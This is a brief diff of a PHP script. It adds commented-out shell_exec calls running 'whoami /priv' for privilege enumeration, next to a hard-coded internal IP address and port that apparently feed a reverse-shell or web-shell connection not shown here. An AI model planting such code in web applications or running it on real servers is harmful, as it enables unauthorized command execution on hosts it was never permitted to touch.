@@ -1,6 +1,8 @@
 <?php
     #$output = shell_exec("whoami");
     #echo "<pre>$output</pre>";
+    #$output = shell_exec("whoami /priv");
+    #echo "<pre>$output</pre>";
     
     $ip = '192.168.52.200';
     $port = 21;
